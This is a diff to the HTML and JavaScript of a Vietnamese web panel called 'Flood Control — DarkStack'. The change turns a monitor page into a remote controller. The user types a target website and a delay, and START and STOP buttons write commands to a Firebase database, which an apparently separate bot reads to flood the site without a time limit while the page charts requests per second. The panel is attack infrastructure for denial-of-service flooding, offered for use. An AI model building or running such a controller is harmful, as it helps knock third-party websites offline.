@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🔥 Flood Monitor — DarkStack</title>
+<title>🔥 Flood Control — DarkStack</title>
 <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
@@ -74,54 +74,70 @@
   .input-row > div { flex:1; min-width:150px; }
   .input-row label { display:block; font-size:12px; color:#7d8590; margin-bottom:6px; }
   .input-row input {
-    width:100%; padding:10px 12px; background:#0d1117;
+    width:100%; padding:12px 14px; background:#0d1117;
     border:1px solid #30363d; border-radius:8px; color:#e6edf3; font-size:14px;
     outline:none; transition:.2s;
   }
   .input-row input:focus { border-color:#00e5ff; box-shadow:0 0 0 3px rgba(0,229,255,.1); }
+
   .btn {
-    padding:10px 20px; border:none; border-radius:8px; cursor:pointer;
-    font-weight:600; font-size:14px; transition:.2s;
-    background: linear-gradient(135deg,#ff3ea5,#00e5ff); color:#000;
+    padding:12px 24px; border:none; border-radius:8px; cursor:pointer;
+    font-weight:700; font-size:15px; transition:.2s; letter-spacing:.5px;
   }
-  .btn:hover { transform:translateY(-1px); box-shadow:0 6px 20px rgba(0,229,255,.3); }
-  .btn.stop { background:linear-gradient(135deg,#f85149,#d29922); }
+  .btn.start {
+    background: linear-gradient(135deg,#3fb950,#00e5ff); color:#000;
+    box-shadow: 0 4px 20px rgba(63,185,80,.3);
+  }
+  .btn.start:hover:not(:disabled) { transform:translateY(-2px); box-shadow:0 8px 28px rgba(63,185,80,.5); }
+  .btn.stop {
+    background: linear-gradient(135deg,#f85149,#d29922); color:#fff;
+    box-shadow: 0 4px 20px rgba(248,81,73,.3);
+  }
+  .btn.stop:hover:not(:disabled) { transform:translateY(-2px); box-shadow:0 8px 28px rgba(248,81,73,.5); }
+  .btn:disabled { opacity:.4; cursor:not-allowed; transform:none !important; }
 
   .hint { font-size:12px; color:#7d8590; margin-top:12px; line-height:1.7; }
   .hint code { background:#161b22; padding:2px 6px; border-radius:4px; color:#00e5ff; }
 
-  .chart-box { position:relative; height:200px; margin-top:10px; }
+  .chart-box { position:relative; height:220px; margin-top:10px; }
+
+  .toast {
+    position:fixed; top:20px; right:20px; padding:14px 20px;
+    background:#161b22; border:1px solid #30363d; border-left:4px solid #00e5ff;
+    border-radius:8px; box-shadow:0 8px 24px rgba(0,0,0,.5);
+    font-size:14px; z-index:9999; opacity:0; transform:translateX(400px);
+    transition:.3s;
+  }
+  .toast.show { opacity:1; transform:translateX(0); }
+  .toast.success { border-left-color:#3fb950; }
+  .toast.error { border-left-color:#f85149; }
+  .toast.warn { border-left-color:#d29922; }
 </style>
 </head>
 <body>
 
 <div class="container">
-  <h1>🔥 Flood Monitor — DarkStack</h1>
-  <div class="sub">Theo dõi tiến độ flood realtime qua Firebase Realtime Database</div>
+  <h1>🔥 Flood Control — DarkStack</h1>
+  <div class="sub">Điều khiển bot từ xa qua Firebase Realtime Database • Không giới hạn thời gian</div>
 
   <!-- ĐIỀU KHIỂN -->
   <div class="card">
-    <h2>⚙️ Điều khiển</h2>
+    <h2>⚙️ Bảng điều khiển</h2>
     <div class="input-row">
       <div style="flex:3;">
-        <label>🔗 Link web cần chạy</label>
+        <label>🔗 Link web cần flood</label>
         <input id="urlInput" type="text" placeholder="https://example.com">
       </div>
-      <div style="flex:1;">
-        <label>⏱️ Số giây chạy</label>
-        <input id="timeInput" type="number" value="60" min="1">
-      </div>
-      <div style="flex:1;">
-        <label>⏳ Delay (0.1–1s)</label>
+      <div style="flex:1; min-width:180px;">
+        <label>⏳ Delay (0.1 – 1s)</label>
         <input id="delayInput" type="number" value="0.1" step="0.1" min="0.1" max="1">
       </div>
-      <button class="btn" id="runBtn">🚀 Chạy lệnh</button>
+      <button class="btn start" id="startBtn">▶️ START</button>
+      <button class="btn stop" id="stopBtn" disabled>⏹ STOP</button>
     </div>
     <div class="hint">
-      💡 Nhập link + số giây → bấm <b>Chạy lệnh</b> → copy command bên dưới và dán vào terminal:
-      <div id="cmdOutput" style="margin-top:10px; background:#0d1117; padding:12px; border-radius:8px; border:1px solid #30363d; font-family:monospace; color:#00e5ff; word-break:break-all;">
-        Nhập link và số giây rồi bấm Chạy...
-      </div>
+      💡 Nhập link + delay → bấm <b>START</b> → bot sẽ tự chạy <b>KHÔNG GIỚI HẠN</b>.<br>
+      🛑 Bấm <b>STOP</b> bất cứ lúc nào để dừng bot.
     </div>
   </div>
 
@@ -131,7 +147,7 @@
       <div>
         <span class="status-badge wait" id="statusBadge">
           <span class="dot"></span>
-          <span id="statusText">Đang chờ dữ liệu...</span>
+          <span id="statusText">Đang kết nối Firebase...</span>
         </span>
       </div>
       <div style="color:#7d8590; font-size:13px;" id="lastUpdate">—</div>
@@ -173,7 +189,7 @@
     </div>
   </div>
 
-  <!-- BIỂU ĐỒ RPS -->
+  <!-- BIỂU ĐỒ -->
   <div class="card">
     <h2>📈 RPS theo thời gian (60s gần nhất)</h2>
     <div class="chart-box"><canvas id="rpsChart"></canvas></div>
@@ -193,8 +209,10 @@
   </div>
 </div>
 
+<div class="toast" id="toast"></div>
+
 <script>
-// ============ FIREBASE CONFIG ============
+// ============ FIREBASE ============
 const firebaseConfig = {
   databaseURL: "https://shopmduy-default-rtdb.asia-southeast1.firebasedatabase.app"
 };
@@ -217,6 +235,15 @@ function fmtTime(s) {
   if (m < 60) return m + 'm ' + r + 's';
   const h = Math.floor(m / 60);
   return h + 'h ' + (m % 60) + 'm';
+}
+function toast(msg, type='info') {
+  const el = document.getElementById('toast');
+  el.textContent = msg;
+  el.className = 'toast show ' + type;
+  setTimeout(() => el.className = 'toast ' + type, 3000);
+}
+function newCmdId() {
+  return Date.now().toString(36) + '-' + Math.random().toString(36).substr(2, 6);
 }
 
 // ============ CHART ============
@@ -248,29 +275,44 @@ const rpsChart = new Chart(ctx, {
   }
 });
 
-// ============ CẬP NHẬT UI ============
-let lastData = null;
+// ============ STATE ============
+let lastRunning = null;
 
+// ============ CẬP NHẬT UI ============
 function updateUI(d) {
   if (!d) return;
-  lastData = d;
 
-  // Trạng thái
+  const isRunning = !!d.running;
+
+  // Trạng thái badge
   const badge = document.getElementById('statusBadge');
   const text = document.getElementById('statusText');
-  if (d.running) {
+  if (isRunning) {
     badge.className = 'status-badge live';
-    text.textContent = '🟢 ĐANG CHẠY';
+    text.textContent = '🟢 ĐANG CHẠY (không giới hạn)';
   } else if (d.total > 0) {
     badge.className = 'status-badge idle';
     text.textContent = '🔴 ĐÃ DỪNG';
   } else {
     badge.className = 'status-badge wait';
-    text.textContent = '⏸ CHƯA BẮT ĐẦU';
+    text.textContent = '⏸ CHỜ LỆNH';
+  }
+
+  // Nút
+  document.getElementById('startBtn').disabled = isRunning;
+  document.getElementById('stopBtn').disabled = !isRunning;
+
+  // Thông báo khi trạng thái đổi
+  if (lastRunning === null) {
+    lastRunning = isRunning;
+  } else if (lastRunning !== isRunning) {
+    if (isRunning) toast('🚀 Bot đã bắt đầu chạy!', 'success');
+    else toast('🛑 Bot đã dừng.', 'warn');
+    lastRunning = isRunning;
   }
 
   // Last update
-  document.getElementById('lastUpdate').textContent = '🕒 Cập nhật: ' + new Date().toLocaleTimeString('vi-VN');
+  document.getElementById('lastUpdate').textContent = '🕒 ' + new Date().toLocaleTimeString('vi-VN');
 
   // Thông tin
   document.getElementById('sUrl').textContent = d.url || '—';
@@ -332,46 +374,70 @@ function updateUI(d) {
 db.ref('current').on('value', (snap) => {
   const d = snap.val();
   if (d) updateUI(d);
+  else {
+    document.getElementById('statusBadge').className = 'status-badge wait';
+    document.getElementById('statusText').textContent = '⏸ Chưa có dữ liệu từ bot';
+  }
 }, (err) => {
   console.error('Firebase error:', err);
   document.getElementById('statusText').textContent = '❌ Lỗi kết nối Firebase';
 });
 
-// ============ NÚT CHẠY ============
-document.getElementById('runBtn').addEventListener('click', () => {
+// ============ START ============
+document.getElementById('startBtn').addEventListener('click', async () => {
   const url = document.getElementById('urlInput').value.trim();
-  const time = document.getElementById('timeInput').value.trim() || '60';
-  const delay = document.getElementById('delayInput').value.trim() || '0.1';
+  const delay = parseFloat(document.getElementById('delayInput').value) || 0.1;
 
   if (!url) {
-    alert('Vui lòng nhập link web!');
+    toast('⚠️ Vui lòng nhập link web!', 'error');
+    return;
+  }
+  if (delay < 0.1 || delay > 1) {
+    toast('⚠️ Delay phải từ 0.1 đến 1 giây!', 'error');
     return;
   }
 
-  // Tạo command gợi ý
-  const cmd = `python att.py`;
-  const info = `🔗 URL: ${url}\n⏱ Số giây: ${time}\n⏳ Delay: ${delay}\n\n` +
-    `➡️ Mở terminal và chạy:\n${cmd}\n\n` +
-    `Sau đó nhập:\n  Link: ${url}\n  Delay: ${delay}\n  Số giây: ${time}`;
-
-  const out = document.getElementById('cmdOutput');
-  out.innerHTML = info.replace(/\n/g, '<br>');
-
-  // Thử ghi yêu cầu lên Firebase để tự động hoá (nếu bạn muốn mở rộng)
-  db.ref('command').set({
-    url: url,
-    duration: parseFloat(time),
-    delay: parseFloat(delay),
-    requested_at: Date.now(),
-    status: 'pending'
-  }).then(() => {
-    console.log('✅ Đã gửi command lên Firebase');
-  }).catch(err => {
-    console.error('Lỗi gửi command:', err);
-  });
+  try {
+    await db.ref('command').set({
+      action: 'start',
+      url: url,
+      delay: delay,
+      cmd_id: newCmdId(),
+      status: 'pending',
+      created_at: Date.now()
+    });
+    toast('🚀 Đã gửi lệnh START lên Firebase', 'success');
+  } catch (e) {
+    console.error(e);
+    toast('❌ Lỗi gửi lệnh: ' + e.message, 'error');
+  }
 });
 
-console.log('🔥 Flood Monitor ready.');
+// ============ STOP ============
+document.getElementById('stopBtn').addEventListener('click', async () => {
+  try {
+    await db.ref('command').set({
+      action: 'stop',
+      cmd_id: newCmdId(),
+      status: 'pending',
+      created_at: Date.now()
+    });
+    toast('🛑 Đã gửi lệnh STOP lên Firebase', 'warn');
+  } catch (e) {
+    console.error(e);
+    toast('❌ Lỗi gửi lệnh: ' + e.message, 'error');
+  }
+});
+
+// Enter để start nhanh
+document.getElementById('urlInput').addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') document.getElementById('startBtn').click();
+});
+document.getElementById('delayInput').addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') document.getElementById('startBtn').click();
+});
+
+console.log('🔥 Flood Control ready.');
 </script>
 </body>
 </html>
